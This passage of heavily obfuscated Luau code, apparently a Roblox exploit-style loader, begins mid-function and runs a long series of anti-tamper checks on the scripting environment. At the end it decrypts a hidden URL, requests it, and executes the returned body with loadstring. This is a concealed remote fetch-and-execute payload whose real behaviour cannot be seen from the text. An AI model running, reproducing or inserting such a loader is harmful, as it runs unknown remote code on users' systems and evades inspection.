				v173 = nil;
				FlatIdent_75331 = 2;
			end
		end
	end
	local v78 = NaN;
	if ((v78 == v78) or rawequal(v78, v78)) then
		v75(1);
	end
	if (not rawequal(v7("\134\39", "\168\171\23\68\52\157\83"), 0 + 0) or (((1 + 0) / v7("\185\33", "\231\148\17\149\205\69\77")) == ((1 + 0) / 0))) then
		v75(2 + 0);
	end
	local v79 = newproxy(true);
	local v80 = newproxy(false);
	if ((type(getmetatable(v79)) ~= v7("\148\166\197\247\82", "\159\224\199\167\155\55")) or (getmetatable(v80) ~= nil)) then
		v75(436 - (153 + 280));
	end
	local v81 = setmetatable({[v7("\229\246\61\222", "\178\151\147\92")]=(31 - 20)}, {[v7("\179\194\69\60\22\73\98", "\26\236\157\44\82\114\44")]={[v7("\56\43\212\87", "\59\74\78\181")]=(20 + 2),[v7("\35\208\81\95", "\211\69\177\58\58")]=(14 + 19)},[v7("\136\218\124\228", "\171\215\133\25\149\137")]=function()
		return true;
	end});
	local v82 = setmetatable({}, getmetatable(v81));
	if ((v81 ~= v82) or rawequal(v81, v82)) then
		v75(3 + 1);
	end
	if ((rawget(v81, v7("\243\205\51\246", "\34\129\168\82\154\143\80\156")) ~= (10 + 1)) or (rawget(v81, v7("\131\179\56\14", "\233\229\210\83\107\40\46")) ~= nil) or (v81.fake ~= (24 + 9))) then
		v75(7 - 2);
	end
end
do
	local function v83(v177)
		v11(v7("\245\67\63\198\0\211\125\96", "\101\161\34\82\182"));
	end
	local v84 = game.GetService;
	local v85 = game.GetService;
	if ((type(v84) ~= v7("\238\24\87\253\207\235\141\32", "\78\136\109\57\158\187\130\226")) or (type(v85) ~= v7("\56\42\247\242\42\54\246\255", "\145\94\95\153"))) then
		v83(1 + 0);
	end
	local v86 = game:GetService(v7("\205\193\21\204\75\165\238", "\215\157\173\116\181\46"));
	local v87 = v84(game, v7("\5\184\138\235\223\39\167", "\186\85\212\235\146"));
	if ((typeof(v86) ~= v7("\235\143\5\234\56\224\91\199", "\56\162\225\118\158\89\142")) or not rawequal(v86, v87)) then
		v83(2);
	end
	if (pcall(v84) or pcall(v84, {}, v7("\108\9\193\182\39\202\79", "\184\60\101\160\207\66")) or pcall(v84, newproxy(true), v7("\1\142\125\165\52\144\111", "\220\81\226\28"))) then
		v83(670 - (89 + 578));
	end
	local v88 = false;
	local function v89()
		return game.GetService(v7("\35\217\131\226\239\213\0", "\167\115\181\226\155\138"));
	end
	local v90 = xpcall(v89, function(v178)
		local v179 = 0 + 0;
		local v180;
		local v181;
		local v182;
		while true do
			if (v179 == (1 - 0)) then
				if ((v180 == v7("\127\105\243", "\80\36\42\174\21")) and (v181 == -(1050 - (572 + 477))) and rawequal(v182, v89) and string.find(tostring(v178), "Expected ':' not '.'", 1, true)) then
					v88 = true;
				end
				break;
			end
			if (v179 == (0 + 0)) then
				local FlatIdent_740DC = 0;
				while true do
					if (FlatIdent_740DC == 1) then
						v179 = 1 + 0;
						break;
					end
					if (FlatIdent_740DC == 0) then
						v180, v181 = debug.info(2 + 0, v7("\241\46", "\166\130\66\135\60\27\17"));
						v182 = debug.info(3, "f");
						FlatIdent_740DC = 1;
					end
				end
			end
		end
	end);
	if (v90 or not v88) then
		v83(4);
	end
	local v91 = Instance.new(v7("\104\31\59\126\75\2", "\26\46\112\87"));
	local v92 = Instance.new(v7("\144\45\191\66\190\179\80\177", "\212\217\67\203\20\223\223\37"));
	v92.Name = v7("\138\159\167\208\191", "\178\218\237\200");
	v92.Parent = v91;
	if not rawequal(v91:FindFirstChild(v7("\134\167\233\210\179", "\176\214\213\134")), v91.FindFirstChild(v91, v7("\196\191\185\214\173", "\57\148\205\214\180\200\54"))) then
		local FlatIdent_78A9D = 0;
		while true do
			if (FlatIdent_78A9D == 0) then
				v91:Destroy();
				v83(91 - (84 + 2));
				break;
			end
		end
	end
	v91:Destroy();
end
do
	local FlatIdent_35C62 = 0;
	local v95;
	local v96;
	local v97;
	local v98;
	local v99;
	local v100;
	local v101;
	local v102;
	local v103;
	while true do
		if (FlatIdent_35C62 == 1) then
			function v96(...)
				return select("#", ...), {...};
			end
			v97, v98 = v96(pcall(function(v184, v185, v186)
				local FlatIdent_243F3 = 0;
				local v187;
				while true do
					if (FlatIdent_243F3 == 0) then
						v187 = 0 + 0;
						while true do
							if (v187 == (842 - (497 + 345))) then
								local FlatIdent_5C408 = 0;
								local v226;
								while true do
									if (FlatIdent_5C408 == 0) then
										v226 = 0 + 0;
										while true do
											if (v226 == (0 + 0)) then
												local FlatIdent_6E23 = 0;
												local v252;
												while true do
													if (FlatIdent_6E23 == 0) then
														v252 = 1333 - (605 + 728);
														while true do
															if (v252 == (0 + 0)) then
																local FlatIdent_43E8E = 0;
																while true do
																	if (FlatIdent_43E8E == 0) then
																		if ((v184 ~= 11) or (v185 ~= nil) or (v186 ~= (73 - 40))) then
																			error(v7("\197\217\20", "\200\164\171\115\164\61\150"), 0);
																		end
																		return nil, v7("\177\255", "\227\222\148\99\37"), nil, 4 + 73, nil;
																	end
																end
															end
														end
														break;
													end
												end
											end
										end
										break;
									end
								end
							end
						end
						break;
					end
				end
			end, 11, nil, 121 - 88));
			if ((v97 ~= 6) or (v98[1 + 0] ~= true) or (v98[2] ~= nil) or (v98[3] ~= v7("\60\89", "\153\83\50\50\150")) or (v98[10 - 6] ~= nil) or (v98[4 + 1] ~= 77) or (v98[6] ~= nil)) then
				v95(490 - (457 + 32));
			end
			FlatIdent_35C62 = 2;
		end
		if (FlatIdent_35C62 == 2) then
			v99, v100 = v96(xpcall(function(v188, v189, v190)
				local FlatIdent_12E4E = 0;
				local v191;
				while true do
					if (0 == FlatIdent_12E4E) then
						v191 = 0 + 0;
						while true do
							if (v191 == (1402 - (832 + 570))) then
								local FlatIdent_89126 = 0;
								while true do
									if (FlatIdent_89126 == 0) then
										if ((v188 ~= "a") or (v189 ~= nil) or (v190 ~= "c")) then
											error(v7("\69\119\97\27", "\45\61\22\19\124\19\203"), 0);
										end
										return nil, 42, nil;
									end
								end
							end
						end
						break;
					end
				end
			end, function(v192)
				return v192;
			end, "a", nil, "c"));
			if ((v99 ~= (4 + 0)) or (v100[1 + 0] ~= true) or (v100[6 - 4] ~= nil) or (v100[2 + 1] ~= (838 - (588 + 208))) or (v100[10 - 6] ~= nil)) then
				v95(1802 - (884 + 916));
			end
			v101 = 0 - 0;
			FlatIdent_35C62 = 3;
		end
		if (0 == FlatIdent_35C62) then
			v95 = nil;
			function v95(v183)
				v11(v7("\38\252\56\36\115\0\194\102", "\22\114\157\85\84"));
			end
			v96 = nil;
			FlatIdent_35C62 = 1;
		end
		if (FlatIdent_35C62 == 3) then
			v102, v103 = xpcall(function()
				error(v7("\199\27\31\230\22", "\217\161\114\109\149\98\16"), 0 + 0);
			end, function()
				local v193 = 653 - (232 + 421);
				local v194;
				while true do
					if (v193 == (1889 - (1569 + 320))) then
						v194 = 0;
						while true do
							if (v194 == (0 + 0)) then
								v101 += (1 + 0)
								error(v7("\1\37\59\115\178\112", "\20\114\64\88\28\220"), 0 - 0);
								break;
							end
						end
						break;
					end
				end
			end);
			if (v102 or (v101 ~= (606 - (316 + 289))) or (string.find(tostring(v103), v7("\52\19\192\187\234\144\180\63\65\215\166\234\223\175\113\9\211\186\252\220\180\63\6", "\221\81\97\178\212\152\176"), 2 - 1, true) == nil)) then
				v95(1 + 2);
			end
			break;
		end
	end
end
do
	local v104 = 1453 - (666 + 787);
	local v105;
	local v106;
	local v107;
	local v108;
	local v109;
	local v110;
	while true do
		if (v104 == 3) then
			if (v110 or not v108) then
				v105(430 - (360 + 65));
			end
			if ((select(-(1 + 0), 259 - (79 + 175), 12 - 4, 11 + 2) ~= (39 - 26)) or (select("#", nil, nil, nil) ~= 3)) then
				v105(11 - 5);
			end
			if pcall(select, 0, 900 - (503 + 396), 2) then
				v105(188 - (92 + 89));
			end
			break;
		end
		if (v104 == (3 - 1)) then
			local FlatIdent_2C453 = 0;
			while true do
				if (FlatIdent_2C453 == 0) then
					v108 = false;
					v109 = nil;
					FlatIdent_2C453 = 1;
				end
				if (FlatIdent_2C453 == 1) then
					function v109()
						return next({a=(1 + 0)}, v7("\21\226\136\84\245\52\42\15\232\136\69\210\54\60\2\210\149\93", "\89\123\141\230\49\141\93"));
					end
					v110 = xpcall(v109, function(v227)
						local FlatIdent_2C195 = 0;
						local v228;
						local v229;
						local v230;
						local v231;
						local v232;
						while true do
							if (FlatIdent_2C195 == 0) then
								v228 = 0;
								v229 = nil;
								FlatIdent_2C195 = 1;
							end
							if (FlatIdent_2C195 == 2) then
								v232 = nil;
								while true do
									if (v228 == (1 + 0)) then
										if ((v229 == v7("\52\133\16", "\136\111\198\77\31\135")) and (v230 == -(3 - 2)) and rawequal(v231, next) and rawequal(v232, v109) and string.find(tostring(v227), v7("\11\7\177\87\177\237\19\233\9\12\190", "\201\98\105\199\54\221\132\119"), 1, true)) then
											v108 = true;
										end
										break;
									end
									if (v228 == 0) then
										local FlatIdent_95405 = 0;
										while true do
											if (1 == FlatIdent_95405) then
												v228 = 1 + 0;
												break;
											end
											if (FlatIdent_95405 == 0) then
												v229, v230, v231 = debug.info(1 + 1, v7("\224\125\240", "\42\147\17\150\108\112"));
												v232 = debug.info(6 - 3, "f");
												FlatIdent_95405 = 1;
											end
										end
									end
								end
								break;
							end
							if (1 == FlatIdent_2C195) then
								v230 = nil;
								v231 = nil;
								FlatIdent_2C195 = 2;
							end
						end
					end);
					FlatIdent_2C453 = 2;
				end
				if (FlatIdent_2C453 == 2) then
					v104 = 2 + 1;
					break;
				end
			end
		end
		if (v104 == (2 - 1)) then
			local FlatIdent_85FF9 = 0;
			while true do
				if (FlatIdent_85FF9 == 1) then
					for v233, v234 in next, v106 do
						local v235 = 0;
						local v236;
						while true do
							if (v235 == 0) then
								v236 = 0;
								while true do
									if (v236 == (1244 - (485 + 759))) then
										if (v233 == v7("\201\118\189\16\145", "\229\174\30\210\99")) then
											v105(6 - 3);
										end
										v107 += v234
										break;
									end
								end
								break;
							end
						end
					end
					if (v107 ~= (1249 - (442 + 747))) then
						v105(1139 - (832 + 303));
					end
					FlatIdent_85FF9 = 2;
				end
				if (FlatIdent_85FF9 == 0) then
					if (pcall(rawlen, 123) or pcall(rawlen, newproxy(true))) then
						v105(1 + 1);
					end
					v107 = 0 - 0;
					FlatIdent_85FF9 = 1;
				end
				if (FlatIdent_85FF9 == 2) then
					v104 = 948 - (88 + 858);
					break;
				end
			end
		end
		if (v104 == 0) then
			v105 = nil;
			function v105(v237)
				v11(v7("\249\230\16\235\31\223\216\78", "\122\173\135\125\155"));
			end
			v106 = setmetatable({10,20,30}, {[v7("\187\254\12\188\49", "\168\228\161\96\217\95\81")]=function()
				return 999;
			end,[v7("\228\238\39\82\43\82\195", "\55\187\177\78\60\79")]={[v7("\42\198\80\248\82", "\224\77\174\63\139\38\175")]=(6 + 117)}});
			if ((#v106 ~= 999) or (rawlen(v106) ~= 3) or (rawlen(v7("\133\67\91\42", "\78\228\33\56")) ~= (793 - (766 + 23)))) then
				v105(1);
			end
			v104 = 1;
		end
	end
end
do
	local function v111(v195)
		v11(v7("\141\13\142\49\7\39\147\234", "\204\217\108\227\65\98\85"));
	end
	local v112 = buffer.create(19 - 15);
	if not v12(tonumber) then
		v111(1 - 0);
	end
	if not v12(string.sub) then
		v111(4 - 2);
	end
	if not v12(string.pack) then
		v111(3);
	end
	if not v12(buffer.readu8) then
		v111(13 - 9);
	end
	if not v12(bit32.extract) then
		v111(5);
	end
	if not v12(utf8.char) then
		v111(6);
	end
	if not v12(Instance.new) then
		v111(1080 - (1036 + 37));
	end
	if not v12(game.GetService) then
		v111(6 + 2);
	end
	local v113, v114, v115, v116 = tonumber, string.byte, bit32.bxor, rawequal;
	local v117 = v113(v7("\10\145", "\160\62\163\149\133\76"));
	local v118 = 0 - 0;
	for v196 = 1 + 0, 5480 - (641 + 839) do
		if (v116(v115(v114("A"), 916 - (910 + 3)), 66) and (v113("7") == (17 - 10))) then
			v118 += 1
		end
	end
	if (v118 ~= (5684 - (1466 + 218))) then
		v111(5 + 4);
	end
end
do
	local function v119(v197)
		v11(v7("\226\161\0\63\198\196\159\94", "\163\182\192\109\79"));
	end
	local v120 = Enum.HashAlgorithm;
	local v121 = v120.FromName;
	local v122 = v120.FromName;
	local v123 = v120.FromValue;
	local v124 = v120.FromValue;
	if ((type(v121) ~= v7("\50\51\14\195\225\61\41\14", "\149\84\70\96\160")) or (type(v123) ~= v7("\62\19\3\238\44\15\2\227", "\141\88\102\109"))) then
		v119(1149 - (556 + 592));
	end
	if (rawequal(v121, v122) or rawequal(v123, v124)) then
		v119(1);
	end
	if not v12(v121) then
		v119(2);
	end
	if not v12(v123) then
		v119(1 + 1);
	end
	if (v120:FromName(v7("\128\91\203\34\79\107", "\161\211\51\170\16\122\93\53")) ~= Enum.HashAlgorithm.Sha256) then
		v119(3);
	end
	if (v120:FromName(v7("\196\145\188\39\245\171\141\23", "\72\155\206\210")) ~= nil) then
		v119(811 - (329 + 479));
	end
	local v125 = Instance.new(v7("\100\115\90\10\50\68\118\81\43\37\67\116\64", "\83\38\26\52\110"));
	local v126 = v125.Event;
	local v127 = v125.Event;
	if (typeof(v126) ~= v7("\106\53\31\117\91\5\46\86\76\36\46\65\86\22\43", "\38\56\119\71")) then
		local FlatIdent_62CB4 = 0;
		local v205;
		while true do
			if (FlatIdent_62CB4 == 0) then
				v205 = 854 - (174 + 680);
				while true do
					if (v205 == (0 - 0)) then
						v125:Destroy();
						v119(8 - 4);
						break;
					end
				end
				break;
			end
		end
	end
	if (v126 ~= v127) then
		local v206 = 0 + 0;
		while true do
			if ((739 - (396 + 343)) == v206) then
				v125:Destroy();
				v119(1 + 3);
				break;
			end
		end
	end
	local v128 = v126:Connect(function()
	end);
	if (v128.Connected ~= true) then
		v128:Disconnect();
		v125:Destroy();
		v119(1482 - (29 + 1448));
	end
	local v129 = false;
	local function v130()
		return v128.Disconnect();
	end
	local v131 = xpcall(v130, function()
		local v198 = 1389 - (135 + 1254);
		local v199;
		local v200;
		local v201;
		while true do
			if (v198 == (3 - 2)) then
				if ((v199 == v7("\237\162\194", "\191\182\225\159\41")) and (v200 == -1) and rawequal(v201, v130)) then
					v129 = true;
				end
				break;
			end
			if ((0 - 0) == v198) then
				local FlatIdent_4E1DE = 0;
				while true do
					if (0 == FlatIdent_4E1DE) then
						v199, v200 = debug.info(2, v7("\224\227", "\54\147\143\56\182\69"));
						v201 = debug.info(3, "f");
						FlatIdent_4E1DE = 1;
					end
					if (FlatIdent_4E1DE == 1) then
						v198 = 1 + 0;
						break;
					end
				end
			end
		end
	end);
	if (v131 or not v129 or (v128.Connected ~= true)) then
		local FlatIdent_3C1AA = 0;
		local v207;
		while true do
			if (FlatIdent_3C1AA == 0) then
				v207 = 1527 - (389 + 1138);
				while true do
					if (v207 == (574 - (102 + 472))) then
						v128:Disconnect();
						v125:Destroy();
						v207 = 1 + 0;
					end
					if (v207 == 1) then
						v119(6);
						break;
					end
				end
				break;
			end
		end
	end
	v128:Disconnect();
	local v132 = v128.Connected == false;
	v125:Destroy();
	if not v132 then
		v119(4 + 3);
	end
	local v133 = v120:GetEnumItems();
	if ((type(v133) ~= v7("\63\19\42\89\142", "\162\75\114\72\53\235\231")) or (#v133 == (0 + 0))) then
		v119(8);
	end
	local v134 = v133[1546 - (320 + 1225)];
	if (typeof(v134) ~= v7("\169\50\81\239\122\22\137\49", "\98\236\92\36\130\51")) then
		v119(14 - 6);
	end
	if (v134.EnumType ~= v120) then
		v119(8);
	end
	local v135 = v120:FromValue(v134.Value);
	if not rawequal(v135, v134) then
		v119(6 + 3);
	end
	local v136 = v120:FromName(v134.Name);
	if not rawequal(v136, v134) then
		v119(1473 - (157 + 1307));
	end
	if (v120:FromValue(-(101858 - (821 + 1038))) ~= nil) then
		v119(10);
	end
	if pcall(function()
		return v120:FromName(306 - 183);
	end) then
		v119(2 + 8);
	end
	if pcall(function()
		return v120:FromValue(v7("\165\27\15", "\80\196\121\108\218\37\200\213"));
	end) then
		v119(17 - 7);
	end
	local v137 = Instance.new(v7("\34\122\12\123\74\12\134\5\86\20\122\69\26", "\234\96\19\98\31\43\110"));
	local v138 = false;
	local v139 = v137.Event:Connect(function()
		v138 = true;
	end);
	v137:Fire();
	task.wait();
	v139:Disconnect();
	v137:Destroy();
	if not v138 then
		v119(5 + 6);
	end
end
_G[v7("\57\62\64\233\147\65\159\7\24\87\147", "\235\102\127\50\167\204\18")] = true;
local v13 = v7("\88\181\225\51\87\116\31\238\231\34\83\96\87\168\225\43\81\44\69\178\240\49\71\33\94\181\240\45\80\96\83\174\248\108\114\43\72\174\249\110\66\39\92\164\230\108\69\60\83\169\186\49\65\40\67\238\253\38\69\42\67\238\248\34\77\32\31\178\225\34\80\39\83\158\246\44\74\58\85\175\225\108\87\58\81\166\240\118\10\34\69\160", "\78\48\193\149\67\36");
local v14 = v8({[v7("\5\12\140", "\33\80\126\224\120")]=v13,[v7("\193\173\23\204\83\232", "\60\140\200\99\164")]=v7("\160\209\48", "\194\231\148\100\70")});
pcall(function()
	loadstring(v14.Body)();
end);
